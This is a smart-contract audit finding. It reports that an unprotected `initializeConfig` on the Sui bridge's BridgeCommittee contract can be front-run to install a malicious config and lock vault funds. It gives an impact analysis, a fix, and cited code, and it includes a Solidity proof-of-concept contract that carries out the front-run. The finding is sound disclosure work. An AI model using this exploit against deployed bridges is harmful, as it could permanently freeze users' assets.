### Title
Unprotected `initializeConfig` on `BridgeCommittee` Allows Any Caller to Inject a Malicious Config, Permanently Locking Bridge Funds — (File: `bridge/evm/contracts/BridgeCommittee.sol`)

---

### Summary

`BridgeCommittee.initializeConfig` is an `external` function with no access-control modifier. Its only guard is `require(address(config) == address(0))`. Because the main `initialize()` call (which sets committee members) and the subsequent `initializeConfig()` call (which sets the `IBridgeConfig` reference) are two separate broadcast transactions in the deployment script, any attacker who monitors the mempool can front-run the second transaction and inject an arbitrary `IBridgeConfig` address. Once set, `config` cannot be changed without a full contract upgrade signed by the committee. A malicious config that returns `address(0)` for all token IDs causes every `_transferTokensFromVault` call to revert, permanently locking all assets held in the `BridgeVault`.

---

### Finding Description

`BridgeCommittee.sol` separates initialization into two steps:

**Step 1 — `initialize()` (protected by OpenZeppelin `initializer`):** [1](#0-0) 

**Step 2 — `initializeConfig()` (no protection at all):** [2](#0-1) 

```solidity
function initializeConfig(address _config) external {
    require(address(config) == address(0), "BridgeCommittee: Config already initialized");
    config = IBridgeConfig(_config);
}
```

The deployment script broadcasts these as separate transactions: [3](#0-2) 

Between the proxy deployment (line 124) and the `initializeConfig` call (line 175), there is an open mempool window. Any EOA can call `initializeConfig(maliciousAddress)` first. The `address(config) == address(0)` check passes because `config` is still zero-initialized, and the malicious address is stored permanently.

The `config` reference is consumed throughout `SuiBridge` via `committee.config()`:

- **`onlySupportedChain` modifier** — calls `committee.config().isChainSupported()`, blocking all deposits and withdrawals if the malicious config returns `false`.
- **`transferBridgedTokensWithSignatures`** — calls `committee.config().chainID()` and `committee.config().tokenAddressOf()`.
- **`_transferTokensFromVault`** — calls `committee.config().tokenAddressOf(tokenID)` and requires the result to be non-zero; a malicious config returning `address(0)` causes every withdrawal to revert.
- **`bridgeERC20` / `bridgeETH`** — call `committee.config().isTokenSupported()` and `tokenAddressOf()`, blocking all deposits. [4](#0-3) [5](#0-4) 

---

### Impact Explanation

An attacker who wins the front-run sets `config` to a contract they control. The simplest payload — returning `address(0)` from `tokenAddressOf()` for every token ID — causes the `require(tokenAddress != address(0), "SuiBridge: Unsupported token")` check inside `_transferTokensFromVault` to revert on every withdrawal attempt. Simultaneously, `isChainSupported()` returning `false` blocks all deposits via the `onlySupportedChain` modifier. The result is that all ERC-20 and ETH assets already held in the `BridgeVault` become permanently inaccessible without a committee-signed contract upgrade — a **permanent fund lock** matching the High allowed impact.

There is no recovery path short of a full UUPS upgrade signed by a quorum of the bridge committee, which is a governance action outside the attacker's control but also outside the normal operational path.

---

### Likelihood Explanation

- The attack requires only a standard EOA and knowledge of the deployment transaction hash (observable in the mempool on any public EVM chain).
- The deployment script broadcasts `initialize` and `initializeConfig` as separate transactions with no atomicity guarantee.
- The attacker needs to submit one transaction with a higher gas price before the deployer's `initializeConfig` transaction is mined — a standard front-run.
- No special privilege, stake, or committee membership is required.

---

### Recommendation

Add the OpenZeppelin `initializer` modifier to `initializeConfig`, or gate it with an `onlyOwner` / deployer check, or — best — merge it into the existing `initialize()` function so both steps are atomic:

```solidity
// In initialize(), after setting up committee members:
require(_config != address(0), "BridgeCommittee: Invalid config");
config = IBridgeConfig(_config);
```

Alternatively, if the two-step pattern must be kept (e.g., because `BridgeConfig` is deployed after `BridgeCommittee`), restrict `initializeConfig` to the deployer address stored during `initialize`:

```solidity
address private _deployer;

function initialize(...) external initializer {
    _deployer = msg.sender;
    ...
}

function initializeConfig(address _config) external {
    require(msg.sender == _deployer, "BridgeCommittee: Not deployer");
    require(address(config) == address(0), "BridgeCommittee: Config already initialized");
    config = IBridgeConfig(_config);
}
```

---

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "../contracts/BridgeCommittee.sol";
import "../contracts/interfaces/IBridgeConfig.sol";

// Malicious config: returns address(0) for all tokens, false for all chains
contract MaliciousConfig is IBridgeConfig {
    function tokenAddressOf(uint8) external pure override returns (address) { return address(0); }
    function tokenSuiDecimalOf(uint8) external pure override returns (uint8) { return 0; }
    function tokenPriceOf(uint8) external pure override returns (uint64) { return 0; }
    function isTokenSupported(uint8) external pure override returns (bool) { return false; }
    function isChainSupported(uint8) external pure override returns (bool) { return false; }
    function chainID() external pure override returns (uint8) { return 0; }
}

contract PoC {
    function attack(address committeeProxy) external {
        // 1. Deployer has just broadcast initialize() but not yet initializeConfig().
        // 2. Attacker front-runs with a higher gas price:
        MaliciousConfig bad = new MaliciousConfig();
        BridgeCommittee(committeeProxy).initializeConfig(address(bad));
        // 3. config is now permanently set to MaliciousConfig.
        // 4. All SuiBridge deposits revert at onlySupportedChain (isChainSupported → false).
        // 5. All SuiBridge withdrawals revert at _transferTokensFromVault
        //    (tokenAddressOf → address(0) → "SuiBridge: Unsupported token").
        // 6. Vault funds are permanently locked.
    }
}
```

### Citations

**File:** bridge/evm/contracts/BridgeCommittee.sol (L30-57)
```text
    function initialize(address[] memory committee, uint16[] memory stake, uint16 minStakeRequired)
        external
        initializer
    {
        __CommitteeUpgradeable_init(address(this));
        __UUPSUpgradeable_init();

        uint256 _committeeLength = committee.length;

        require(_committeeLength < 256, "BridgeCommittee: Committee length must be less than 256");

        require(
            _committeeLength == stake.length,
            "BridgeCommittee: Committee and stake arrays must be of the same length"
        );

        uint16 totalStake;
        for (uint16 i; i < _committeeLength; i++) {
            require(
                committeeStake[committee[i]] == 0, "BridgeCommittee: Duplicate committee member"
            );
            committeeStake[committee[i]] = stake[i];
            committeeIndex[committee[i]] = uint8(i);
            totalStake += stake[i];
        }

        require(totalStake >= minStakeRequired, "BridgeCommittee: total stake is less than minimum"); // 10000 == 100%
    }
```

**File:** bridge/evm/contracts/BridgeCommittee.sol (L63-66)
```text
    function initializeConfig(address _config) external {
        require(address(config) == address(0), "BridgeCommittee: Config already initialized");
        config = IBridgeConfig(_config);
    }
```

**File:** bridge/evm/script/deploy_bridge.s.sol (L124-178)
```text
        address bridgeCommittee = Upgrades.deployUUPSProxy(
            "BridgeCommittee.sol",
            abi.encodeCall(
                BridgeCommittee.initialize,
                (
                    deployConfig.committeeMembers,
                    committeeMemberStake,
                    uint16(deployConfig.minCommitteeStakeRequired)
                )
            ),
            opts
        );

        // deploy bridge config =====================================================================

        // convert token prices from uint256 to uint64
        uint64[] memory tokenPrices = new uint64[](deployConfig.tokenPrices.length);
        for (uint256 i; i < deployConfig.tokenPrices.length; i++) {
            tokenPrices[i] = uint64(deployConfig.tokenPrices[i]);
        }

        // convert Sui Decimals from uint256 to uint8
        uint8[] memory suiDecimals = new uint8[](deployConfig.suiDecimals.length);
        for (uint256 i; i < deployConfig.suiDecimals.length; i++) {
            suiDecimals[i] = uint8(deployConfig.suiDecimals[i]);
        }

        // convert Token Id from uint256 to uint8
        uint8[] memory tokenIds = new uint8[](deployConfig.tokenIds.length);
        for (uint256 i; i < deployConfig.tokenIds.length; i++) {
            tokenIds[i] = uint8(deployConfig.tokenIds[i]);
        }

        address bridgeConfig = Upgrades.deployUUPSProxy(
            "BridgeConfig.sol",
            abi.encodeCall(
                BridgeConfig.initialize,
                (
                    address(bridgeCommittee),
                    uint8(deployConfig.sourceChainId),
                    deployConfig.supportedTokens,
                    tokenPrices,
                    tokenIds,
                    suiDecimals,
                    supportedChainIds
                )
            ),
            opts
        );

        // initialize config in the bridge committee
        BridgeCommittee(bridgeCommittee).initializeConfig(address(bridgeConfig));
        BridgeCommittee committeeImplementation =
            BridgeCommittee(Upgrades.getImplementationAddress(bridgeCommittee));
        committeeImplementation.initializeConfig(address(bridgeConfig));
```

**File:** bridge/evm/contracts/SuiBridge.sol (L244-265)
```text
    function _transferTokensFromVault(
        uint8 sendingChainID,
        uint8 tokenID,
        address recipientAddress,
        uint256 amount
    ) private whenNotPaused limitNotExceeded(sendingChainID, tokenID, amount) {
        address tokenAddress = committee.config().tokenAddressOf(tokenID);

        // Check that the token address is supported
        require(tokenAddress != address(0), "SuiBridge: Unsupported token");

        // transfer eth if token type is eth
        if (tokenID == BridgeUtils.ETH) {
            vault.transferETH(payable(recipientAddress), amount);
        } else {
            // transfer tokens from vault to target address
            vault.transferERC20(tokenAddress, recipientAddress, amount);
        }

        // update amount bridged
        limiter.recordBridgeTransfers(sendingChainID, tokenID, amount);
    }
```

**File:** bridge/evm/contracts/SuiBridge.sol (L283-289)
```text
    modifier onlySupportedChain(uint8 targetChainID) {
        require(
            committee.config().isChainSupported(targetChainID),
            "SuiBridge: Target chain not supported"
        );
        _;
    }
```
